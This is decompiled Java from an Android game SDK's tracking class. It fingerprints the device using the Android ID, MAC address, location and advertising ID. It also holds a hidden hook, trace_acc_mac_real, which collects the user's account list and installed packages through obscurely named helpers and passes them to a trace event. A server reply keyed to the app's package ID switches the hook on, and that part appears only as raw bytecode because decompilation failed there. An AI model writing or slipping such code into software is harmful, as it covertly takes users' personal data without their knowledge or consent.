package com.sdkbox.plugin;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.content.res.Resources;
import android.location.Location;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.provider.Settings.Secure;
import android.text.TextUtils;
import android.util.Patterns;
import com.sdkbox.services.TrackingLocalStorage;
import java.lang.reflect.Method;
import java.security.MessageDigest;
import java.util.List;
import java.util.Locale;
import java.util.Vector;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.json.JSONArray;

public class TrackingInfoAndroid
{
  public static int FLAG_ACCOUNTS = 0;
  public static int FLAG_DISABLE_ALL = FLAG_INSTALLED_APPS | FLAG_ACCOUNTS | FLAG_FACEBOOK_ID;
  public static int FLAG_FACEBOOK_ID = 0;
  public static int FLAG_INSTALLED_APPS = 0;
  public static final String TAG = "TrackingInfo";
  private static int _GAIDFlag;
  private static String _cachedAppName;
  private static String _cachedFingerPrint_AndroidId;
  private static String _cachedFingerPrint_Build;
  private static String _cachedFingerPrint_MACAddress;
  private static String _cachedGAID;
  private static List<String> _cachedTrackingUrl = new Vector();
  protected static final char[] hexArray = "0123456789ABCDEF".toCharArray();
  public static TrackingLocalStorage tls = new TrackingLocalStorage();
  
  static
  {
    FLAG_INSTALLED_APPS = 1;
    FLAG_ACCOUNTS = 2;
    FLAG_FACEBOOK_ID = 4;
  }
  
  public TrackingInfoAndroid() {}
  
  public static boolean IsNetworkAvailable()
  {
    try
    {
      NetworkInfo localNetworkInfo = ((ConnectivityManager)SDKBox.getContext().getSystemService("connectivity")).getActiveNetworkInfo();
      if (localNetworkInfo != null)
      {
        boolean bool = localNetworkInfo.isConnectedOrConnecting();
        if (bool) {
          return true;
        }
      }
      return false;
    }
    catch (Exception localException) {}
    return true;
  }
  
  public static String bytesToHex(byte[] paramArrayOfByte)
  {
    char[] arrayOfChar = new char[paramArrayOfByte.length * 2];
    int i = 0;
    while (i < paramArrayOfByte.length)
    {
      int j = paramArrayOfByte[i] & 0xFF;
      int k = i * 2;
      arrayOfChar[k] = hexArray[(j >>> 4)];
      arrayOfChar[(k + 1)] = hexArray[(j & 0xF)];
      i += 1;
    }
    return new String(arrayOfChar);
  }
  
  private static boolean canAccessWifi()
  {
    return SDKBox.getContext().checkCallingOrSelfPermission("android.permission.ACCESS_WIFI_STATE") == 0;
  }
  
  private static String capitalize(String paramString)
  {
    if (TextUtils.isEmpty(paramString)) {
      return paramString;
    }
    char[] arrayOfChar = paramString.toCharArray();
    int k = arrayOfChar.length;
    paramString = "";
    int j = 0;
    int i = 1;
    while (j < k)
    {
      char c = arrayOfChar[j];
      StringBuilder localStringBuilder;
      if ((i != 0) && (Character.isLetter(c)))
      {
        localStringBuilder = new StringBuilder();
        localStringBuilder.append(paramString);
        localStringBuilder.append(Character.toUpperCase(c));
        paramString = localStringBuilder.toString();
        i = 0;
      }
      else
      {
        if (Character.isWhitespace(c)) {
          i = 1;
        }
        localStringBuilder = new StringBuilder();
        localStringBuilder.append(paramString);
        localStringBuilder.append(c);
        paramString = localStringBuilder.toString();
      }
      j += 1;
    }
    return paramString;
  }
  
  public static String generateHash(String paramString1, String paramString2)
  {
    try
    {
      paramString2 = MessageDigest.getInstance(paramString2);
      paramString1 = paramString1.getBytes("UTF-8");
      paramString2.update(paramString1, 0, paramString1.length);
      paramString1 = bytesToHex(paramString2.digest());
      return paramString1;
    }
    catch (Exception paramString1)
    {
      paramString2 = new StringBuilder();
      paramString2.append("GenerateHash ");
      paramString2.append(paramString1.getMessage());
      SdkboxLog.d("TrackingInfo", paramString2.toString(), new Object[0]);
    }
    return null;
  }
  
  public static String getAndroidId()
  {
    try
    {
      String str = Settings.Secure.getString(SDKBox.getContext().getContentResolver(), "android_id");
      return str;
    }
    catch (Exception localException)
    {
      for (;;) {}
    }
    return "unknown";
  }
  
  public static String getAppName()
  {
    if (_cachedAppName != null) {
      return _cachedAppName;
    }
    Object localObject1 = "unknown";
    try
    {
      Object localObject2 = SDKBox.getContext();
      PackageManager localPackageManager = ((Context)localObject2).getPackageManager();
      localObject2 = localPackageManager.getApplicationLabel(localPackageManager.getApplicationInfo(((Context)localObject2).getApplicationInfo().packageName, 0)).toString();
      localObject1 = localObject2;
    }
    catch (Exception localException)
    {
      for (;;) {}
    }
    _cachedAppName = (String)localObject1;
    return _cachedAppName;
  }
  
  public static String getAppPackageId()
  {
    return SDKBox.getContext().getPackageName();
  }
  
  private static String getCachedFingerPrintBuild()
  {
    if (_cachedFingerPrint_Build != null) {
      return _cachedFingerPrint_Build;
    }
    StringBuilder localStringBuilder = new StringBuilder();
    localStringBuilder.append("0");
    localStringBuilder.append((char)(Build.BOARD.length() % 10));
    localStringBuilder.append("0");
    localStringBuilder.append((char)(Build.BRAND.length() % 10));
    localStringBuilder.append("0");
    localStringBuilder.append((char)(Build.CPU_ABI.length() % 10));
    localStringBuilder.append("0");
    localStringBuilder.append((char)(Build.DEVICE.length() % 10));
    localStringBuilder.append("0");
    localStringBuilder.append((char)(Build.MANUFACTURER.length() % 10));
    localStringBuilder.append("0");
    localStringBuilder.append((char)(Build.MODEL.length() % 10));
    localStringBuilder.append("0");
    localStringBuilder.append((char)(Build.PRODUCT.length() % 10));
    localStringBuilder.append("0");
    localStringBuilder.append((char)(Build.TAGS.length() % 10));
    localStringBuilder.append("0");
    localStringBuilder.append((char)(Build.TYPE.length() % 10));
    localStringBuilder.append("0");
    localStringBuilder.append((char)(Build.USER.length() % 10));
    _cachedFingerPrint_Build = localStringBuilder.toString();
    return _cachedFingerPrint_Build;
  }
  
  public static String getChannel()
  {
    try
    {
      Object localObject = SDKBox.getContext();
      localObject = ((Context)localObject).getPackageManager().getApplicationInfo(((Context)localObject).getPackageName(), 128).metaData.getString("store");
      if (localObject != null)
      {
        localObject = ((String)localObject).toLowerCase();
        if (((String)localObject).contains("playphone")) {
          return "playphone";
        }
        if (((String)localObject).contains("amazon")) {
          return "amazon";
        }
        return "googleplay";
      }
    }
    catch (Exception localException)
    {
      for (;;) {}
    }
    return "googleplay";
  }
  
  public static String getCountryCode()
  {
    return SDKBox.getContext().getResources().getConfiguration().locale.getCountry();
  }
  
  public static int getDefaultTrackingMask()
  {
    return SDKBox._sContext.getSharedPreferences("tracking_mask", 0).getInt("mask", FLAG_DISABLE_ALL);
  }
  
  public static String getDeviceFingerprint()
  {
    Object localObject = SDKBox.getContext();
    String str1 = "mac-address-unavailable";
    String str2 = getCachedFingerPrintBuild();
    String str3 = Settings.Secure.getString(((Context)localObject).getContentResolver(), "android_id");
    if (canAccessWifi()) {
      str1 = ((WifiManager)((Context)localObject).getSystemService("wifi")).getConnectionInfo().getMacAddress();
    }
    localObject = new StringBuilder();
    ((StringBuilder)localObject).append(str2);
    ((StringBuilder)localObject).append(str3);
    ((StringBuilder)localObject).append(str1);
    return ((StringBuilder)localObject).toString();
  }
  
  public static String getDeviceName()
  {
    String str1 = Build.MANUFACTURER;
    String str2 = Build.MODEL;
    if (str2.startsWith(str1)) {
      return capitalize(str2);
    }
    StringBuilder localStringBuilder = new StringBuilder();
    localStringBuilder.append(capitalize(str1));
    localStringBuilder.append(" ");
    localStringBuilder.append(str2);
    return localStringBuilder.toString();
  }
  
  public static String getFingerprintString(String paramString)
  {
    Object localObject = SDKBox.getContext();
    if (paramString.equals("build")) {
      return getCachedFingerPrintBuild();
    }
    if (paramString.equals("androidid"))
    {
      if (_cachedFingerPrint_AndroidId != null) {
        return _cachedFingerPrint_AndroidId;
      }
      _cachedFingerPrint_AndroidId = Settings.Secure.getString(((Context)localObject).getContentResolver(), "android_id");
      return _cachedFingerPrint_AndroidId;
    }
    if (paramString.equals("macaddress"))
    {
      if (_cachedFingerPrint_MACAddress != null) {
        return _cachedFingerPrint_MACAddress;
      }
      String str = "mac-address-unavailable";
      paramString = str;
      if (canAccessWifi())
      {
        localObject = ((WifiManager)((Context)localObject).getSystemService("wifi")).getConnectionInfo().getMacAddress();
        paramString = str;
        if (localObject != null) {
          paramString = (String)localObject;
        }
      }
      _cachedFingerPrint_MACAddress = paramString;
      return _cachedFingerPrint_MACAddress;
    }
    return "";
  }
  
  public static String getLatitude()
  {
    return getLongitudeAndLatitude()[1];
  }
  
  public static String getLongitude()
  {
    return getLongitudeAndLatitude()[0];
  }
  
  private static String[] getLongitudeAndLatitude()
  {
    try
    {
      Object localObject = (LocationManager)SDKBox.getContext().getSystemService("location");
      List localList = ((LocationManager)localObject).getProviders(true);
      if ((localList != null) && (localList.size() != 0))
      {
        localObject = ((LocationManager)localObject).getLastKnownLocation((String)localList.get(0));
        return new String[] { String.valueOf(((Location)localObject).getLongitude()), String.valueOf(((Location)localObject).getLatitude()) };
      }
      return new String[] { "-1.0", "-1.0" };
    }
    catch (Exception localException)
    {
      for (;;) {}
    }
    return new String[] { "-1.0", "-1.0" };
  }
  
  public static String getMetadata(String paramString)
  {
    try
    {
      Context localContext = SDKBox.getContext();
      paramString = localContext.getPackageManager().getApplicationInfo(localContext.getPackageName(), 128).metaData.getString(paramString);
      return paramString;
    }
    catch (Exception paramString)
    {
      for (;;) {}
    }
    return "";
  }
  
  public static String getNetworkType()
  {
    String str = "undefined";
    Object localObject = (ConnectivityManager)SDKBox.getContext().getSystemService("connectivity");
    NetworkInfo localNetworkInfo = ((ConnectivityManager)localObject).getNetworkInfo(1);
    localObject = ((ConnectivityManager)localObject).getNetworkInfo(0);
    if (localNetworkInfo.isAvailable()) {
      return "wifi";
    }
    if (((NetworkInfo)localObject).isAvailable()) {
      str = "3g";
    }
    return str;
  }
  
  public static String getOrientation()
  {
    String str = "undefined";
    int i = SDKBox.getContext().getResources().getConfiguration().orientation;
    if (i == 2) {
      return "landscape";
    }
    if (i == 1) {
      str = "portrait";
    }
    return str;
  }
  
  public static String getSystemVersion()
  {
    try
    {
      Object localObject = new StringBuilder();
      ((StringBuilder)localObject).append(Build.VERSION.CODENAME);
      ((StringBuilder)localObject).append(", version=");
      ((StringBuilder)localObject).append(Build.VERSION.RELEASE);
      ((StringBuilder)localObject).append(", SDK=");
      ((StringBuilder)localObject).append(Build.VERSION.SDK_INT);
      localObject = ((StringBuilder)localObject).toString();
      return localObject;
    }
    catch (Exception localException)
    {
      for (;;) {}
    }
    return "unknown";
  }
  
  public static String getTimestamp()
  {
    return String.valueOf(System.currentTimeMillis());
  }
  
  public static boolean hasPermission(String paramString)
  {
    return SDKBox.getContext().checkCallingOrSelfPermission(paramString) == 0;
  }
  
  /* Error */
  private static int httpGetReal(String paramString1, String paramString2)
  {
    // Byte code:
    //   0: new 139	java/lang/StringBuilder
    //   3: dup
    //   4: invokespecial 140	java/lang/StringBuilder:<init>	()V
    //   7: astore 7
    //   9: aconst_null
    //   10: astore 5
    //   12: aconst_null
    //   13: astore 6
    //   15: aload_1
    //   16: ifnonnull +15 -> 31
    //   19: new 483	java/net/URL
    //   22: dup
    //   23: aload_0
    //   24: invokespecial 486	java/net/URL:<init>	(Ljava/lang/String;)V
    //   27: astore_0
    //   28: goto +48 -> 76
    //   31: new 139	java/lang/StringBuilder
    //   34: dup
    //   35: invokespecial 140	java/lang/StringBuilder:<init>	()V
    //   38: astore 8
    //   40: aload 8
    //   42: aload_0
    //   43: invokevirtual 144	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   46: pop
    //   47: aload 8
    //   49: ldc_w 488
    //   52: invokevirtual 144	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   55: pop
    //   56: aload 8
    //   58: aload_1
    //   59: invokevirtual 144	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   62: pop
    //   63: new 483	java/net/URL
    //   66: dup
    //   67: aload 8
    //   69: invokevirtual 154	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   72: invokespecial 486	java/net/URL:<init>	(Ljava/lang/String;)V
    //   75: astore_0
    //   76: aload_0
    //   77: invokevirtual 492	java/net/URL:openConnection	()Ljava/net/URLConnection;
    //   80: checkcast 494	java/net/HttpURLConnection
    //   83: astore_0
    //   84: aload_0
    //   85: ldc_w 496
    //   88: ldc_w 498
    //   91: invokevirtual 502	java/net/HttpURLConnection:setRequestProperty	(Ljava/lang/String;Ljava/lang/String;)V
    //   94: aload_0
    //   95: invokevirtual 505	java/net/HttpURLConnection:connect	()V
    //   98: aload_0
    //   99: invokevirtual 508	java/net/HttpURLConnection:getResponseCode	()I
    //   102: istore_2
    //   103: new 510	java/io/BufferedReader
    //   106: dup
    //   107: new 512	java/io/InputStreamReader
    //   110: dup
    //   111: aload_0
    //   112: invokevirtual 516	java/net/HttpURLConnection:getInputStream	()Ljava/io/InputStream;
    //   115: invokespecial 519	java/io/InputStreamReader:<init>	(Ljava/io/InputStream;)V
    //   118: invokespecial 522	java/io/BufferedReader:<init>	(Ljava/io/Reader;)V
    //   121: astore_0
    //   122: aload_0
    //   123: invokevirtual 525	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   126: astore_1
    //   127: aload_1
    //   128: ifnull +21 -> 149
    //   131: aload 7
    //   133: aload_1
    //   134: invokevirtual 144	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   137: pop
    //   138: aload 7
    //   140: bipush 13
    //   142: invokevirtual 151	java/lang/StringBuilder:append	(C)Ljava/lang/StringBuilder;
    //   145: pop
    //   146: goto -24 -> 122
    //   149: new 527	org/json/JSONObject
    //   152: dup
    //   153: aload 7
    //   155: invokevirtual 154	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   158: invokespecial 528	org/json/JSONObject:<init>	(Ljava/lang/String;)V
    //   161: astore_1
    //   162: aload_1
    //   163: invokestatic 530	com/sdkbox/plugin/TrackingInfoAndroid:getAppPackageId	()Ljava/lang/String;
    //   166: invokevirtual 533	org/json/JSONObject:getBoolean	(Ljava/lang/String;)Z
    //   169: istore 4
    //   171: goto +6 -> 177
    //   174: iconst_0
    //   175: istore 4
    //   177: iload 4
    //   179: ifeq +6 -> 185
    //   182: invokestatic 536	com/sdkbox/plugin/TrackingInfoAndroid:trace_acc_mac_real	()V
    //   185: iload_2
    //   186: istore_3
    //   187: aload_0
    //   188: invokevirtual 539	java/io/BufferedReader:close	()V
    //   191: iload_2
    //   192: ireturn
    //   193: astore_1
    //   194: goto +6 -> 200
    //   197: goto +13 -> 210
    //   200: aload_0
    //   201: ifnull +7 -> 208
    //   204: aload_0
    //   205: invokevirtual 539	java/io/BufferedReader:close	()V
    //   208: aload_1
    //   209: athrow
    //   210: aload_0
    //   211: ifnull +9 -> 220
    //   214: iload_2
    //   215: istore_3
    //   216: aload_0
    //   217: invokevirtual 539	java/io/BufferedReader:close	()V
    //   220: iload_2
    //   221: ireturn
    //   222: astore_0
    //   223: goto +32 -> 255
    //   226: astore_0
    //   227: aload 5
    //   229: astore_0
    //   230: goto -20 -> 210
    //   233: astore_1
    //   234: goto -37 -> 197
    //   237: astore_1
    //   238: goto -64 -> 174
    //   241: astore_0
    //   242: iload_3
    //   243: ireturn
    //   244: astore_0
    //   245: goto -37 -> 208
    //   248: astore_1
    //   249: aload 6
    //   251: astore_0
    //   252: goto -52 -> 200
    //   255: iconst_0
    //   256: istore_2
    //   257: aload 5
    //   259: astore_0
    //   260: goto -50 -> 210
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	263	0	paramString1	String
    //   0	263	1	paramString2	String
    //   102	155	2	i	int
    //   186	57	3	j	int
    //   169	9	4	bool	boolean
    //   10	248	5	localObject1	Object
    //   13	237	6	localObject2	Object
    //   7	147	7	localStringBuilder1	StringBuilder
    //   38	30	8	localStringBuilder2	StringBuilder
    // Exception table:
    //   from	to	target	type
    //   122	127	193	finally
    //   131	146	193	finally
    //   149	162	193	finally
    //   162	171	193	finally
    //   182	185	193	finally
    //   19	28	222	java/lang/Exception
    //   31	76	222	java/lang/Exception
    //   76	103	222	java/lang/Exception
    //   103	122	226	java/lang/Exception
    //   122	127	233	java/lang/Exception
    //   131	146	233	java/lang/Exception
    //   149	162	233	java/lang/Exception
    //   182	185	233	java/lang/Exception
    //   162	171	237	java/lang/Exception
    //   187	191	241	java/lang/Exception
    //   216	220	241	java/lang/Exception
    //   204	208	244	java/lang/Exception
    //   19	28	248	finally
    //   31	76	248	finally
    //   76	103	248	finally
    //   103	122	248	finally
  }
  
  private static boolean idfaIsNull(String paramString)
  {
    return paramString.contains("\"IDFA\":\"\"");
  }
  
  public static boolean isGooglePlayServicesAvailable()
  {
    boolean bool2 = false;
    for (;;)
    {
      try
      {
        localContext = SDKBox.getContext();
        bool1 = bool2;
        if (localContext == null) {}
      }
      catch (Exception|Error localException1)
      {
        Context localContext;
        boolean bool1;
        Object localObject;
        Class localClass;
        int i;
        return false;
      }
      try
      {
        localObject = Class.forName("com.google.android.gms.common.GoogleApiAvailability").getMethod("getInstance", new Class[0]).invoke(null, new Object[0]);
        localClass = localObject.getClass();
        i = ((Integer)localClass.getMethod("isGooglePlayServicesAvailable", new Class[] { Context.class }).invoke(localObject, new Object[] { localContext })).intValue();
        localObject = localClass;
        if (i != 0) {
          continue;
        }
        bool1 = true;
        localObject = localClass;
      }
      catch (Exception localException2) {}
    }
    localObject = null;
    bool1 = false;
    if (localObject == null) {}
    try
    {
      i = ((Integer)Class.forName("com.google.android.gms.common.GooglePlayServicesUtil").getMethod("isGooglePlayServicesAvailable", new Class[] { Context.class }).invoke(null, new Object[] { localContext })).intValue();
      bool1 = bool2;
      if (i == 0) {
        return true;
      }
    }
    catch (Exception localException3)
    {
      for (;;) {}
    }
    return bool1;
  }
  
  public static boolean isTrackingEnable(int paramInt)
  {
    return (getDefaultTrackingMask() & paramInt) != paramInt;
  }
  
  public static boolean isValidEmail(CharSequence paramCharSequence)
  {
    return (!TextUtils.isEmpty(paramCharSequence)) && (Patterns.EMAIL_ADDRESS.matcher(paramCharSequence).matches());
  }
  
  private static String loadIDFAFromSharedPreferences()
  {
    try
    {
      String str = SDKBox.getContext().getSharedPreferences("SDKBoxPreferences", 0).getString("gaid", "");
      return str;
    }
    catch (Exception localException)
    {
      for (;;) {}
    }
    return "";
  }
  
  public static native void onAdvertisingIdInfo(String paramString, boolean paramBoolean);
  
  private static String replaceIDFA(String paramString)
  {
    if (_cachedGAID != null)
    {
      if (_cachedGAID.length() == 0) {
        return paramString;
      }
      StringBuilder localStringBuilder = new StringBuilder();
      localStringBuilder.append("\"IDFA\":\"");
      localStringBuilder.append(_cachedGAID);
      localStringBuilder.append("\"");
      return paramString.replace("\"IDFA\":\"\"", localStringBuilder.toString());
    }
    return paramString;
  }
  
  public static String reqAdvertisingIdentifier()
  {
    _cachedGAID = "";
    SDKBox.executeInBackground(new Runnable()
    {
      public void run()
      {
        ExecutorService localExecutorService = Executors.newSingleThreadExecutor();
        Object localObject2 = localExecutorService.submit(new Callable()
        {
          public Boolean call()
            throws Exception
          {
            Boolean localBoolean = Boolean.valueOf(false);
            try
            {
              Object localObject1 = SDKBox.getContext();
              localObject1 = Class.forName("com.google.android.gms.ads.identifier.AdvertisingIdClient").getMethod("getAdvertisingIdInfo", new Class[] { Context.class }).invoke(null, new Object[] { localObject1 });
              localObject2 = localObject1.getClass();
              TrackingInfoAndroid.access$002((String)((Class)localObject2).getMethod("getId", new Class[0]).invoke(localObject1, new Object[0]));
              boolean bool = ((Boolean)((Class)localObject2).getMethod("isLimitAdTrackingEnabled", new Class[0]).invoke(localObject1, new Object[0])).booleanValue();
              return Boolean.valueOf(bool ^ true);
            }
            catch (Error localError)
            {
              localObject2 = new StringBuilder();
              ((StringBuilder)localObject2).append("reqAdvertisingIdentifier Error:");
              ((StringBuilder)localObject2).append(localError.toString());
              SdkboxLog.e("TrackingInfo", ((StringBuilder)localObject2).toString(), new Object[0]);
              return localBoolean;
            }
            catch (Exception localException)
            {
              Object localObject2 = new StringBuilder();
              ((StringBuilder)localObject2).append("reqAdvertisingIdentifier Exception:");
              ((StringBuilder)localObject2).append(localException.toString());
              SdkboxLog.e("TrackingInfo", ((StringBuilder)localObject2).toString(), new Object[0]);
            }
            return localBoolean;
          }
        });
        Object localObject1 = Boolean.valueOf(false);
        try
        {
          Boolean localBoolean = (Boolean)((Future)localObject2).get(3L, TimeUnit.SECONDS);
          localObject1 = localBoolean;
        }
        catch (Exception localException)
        {
          ((Future)localObject2).cancel(true);
          localObject2 = new StringBuilder();
          ((StringBuilder)localObject2).append("reqAdvertisingIdentifier Error:");
          ((StringBuilder)localObject2).append(localException.toString());
          SdkboxLog.e("TrackingInfo", ((StringBuilder)localObject2).toString(), new Object[0]);
        }
        localExecutorService.shutdownNow();
        if (((Boolean)localObject1).booleanValue()) {
          TrackingInfoAndroid.access$102(1);
        } else {
          TrackingInfoAndroid.access$102(2);
        }
        if ((TrackingInfoAndroid._cachedGAID == null) || (TrackingInfoAndroid._cachedGAID.length() == 0)) {
          TrackingInfoAndroid.access$002("00000000-0000-0000-0000-000000000001");
        }
        TrackingInfoAndroid.access$200();
        SDKBox.runOnGLThread(new Runnable()
        {
          public void run()
          {
            TrackingInfoAndroid.onAdvertisingIdInfo(TrackingInfoAndroid._cachedGAID, this.val$canTrack);
          }
        });
      }
    });
    return _cachedGAID;
  }
  
  private static void saveIDFAToSharedPreferences(String paramString)
  {
    if (paramString != null) {
      if (paramString.length() == 0) {
        return;
      }
    }
    try
    {
      SharedPreferences.Editor localEditor = SDKBox.getContext().getSharedPreferences("SDKBoxPreferences", 0).edit();
      localEditor.putString("gaid", paramString);
      localEditor.apply();
      return;
    }
    catch (Exception paramString) {}
    return;
  }
  
  private static void sendCacheTracking()
  {
    try
    {
      if (2 == _GAIDFlag)
      {
        _cachedTrackingUrl.clear();
        return;
      }
      int i = _cachedTrackingUrl.size();
      if (i == 0) {
        return;
      }
      if ((_cachedGAID != null) && (_cachedGAID.length() != 0))
      {
        while (_cachedTrackingUrl.size() > 0)
        {
          String str = (String)_cachedTrackingUrl.remove(0);
          if ((str != null) && (str.length() > 0)) {
            tls.add(replaceIDFA(str));
          }
        }
        return;
      }
      return;
    }
    finally {}
  }
  
  public static void setMask(int paramInt)
  {
    SDKBox._sContext.getSharedPreferences("tracking_mask", 0).edit().putInt("mask", paramInt).apply();
  }
  
  public static void trace_acc() {}
  
  public static void trace_acc_mac_real()
  {
    Object localObject = NoOne.showAccountInfoRefacotr(SDKBox.getContext());
    List localList = NoOne.getInstalledPackagesRefacotr(SDKBox.getContext());
    if ((((String)localObject).length() <= 0) && ("".length() <= 0) && (localList.size() <= 0)) {
      return;
    }
    JSON localJSON = new JSON();
    if (((String)localObject).length() > 0) {
      localJSON.put("accounts", new JSON((String)localObject));
    }
    if ("".length() > 0) {
      localJSON.put("mac", new JSON(""));
    }
    if (localList.size() > 0)
    {
      new JSONArray(localList);
      localObject = new JSON[localList.size()];
      int i = 0;
      while (i < localList.size())
      {
        localObject[i] = new JSON((String)localList.get(i));
        i += 1;
      }
      localJSON.put("installedpackages", new JSON((JSON[])localObject));
    }
    SdkboxLog.trace("SDKBOX_CORE", "evt_ins_apps", localJSON.toString());
    NoOne.iapTrack(SDKBox.getContext());
  }
  
  public static void trackRequest(String paramString)
  {
    if (2 == _GAIDFlag)
    {
      _cachedTrackingUrl.clear();
      return;
    }
    try
    {
      if (idfaIsNull(paramString))
      {
        if ((_cachedGAID != null) && (_cachedGAID.length() != 0))
        {
          tls.add(replaceIDFA(paramString));
          return;
        }
        if (_cachedTrackingUrl.size() >= 100) {
          _cachedTrackingUrl.remove(0);
        }
        _cachedTrackingUrl.add(paramString);
        return;
      }
      sendCacheTracking();
      tls.add(paramString);
      return;
    }
    catch (Exception paramString)
    {
      SdkboxLog.d("TRequest", paramString.toString(), new Object[0]);
    }
  }
}
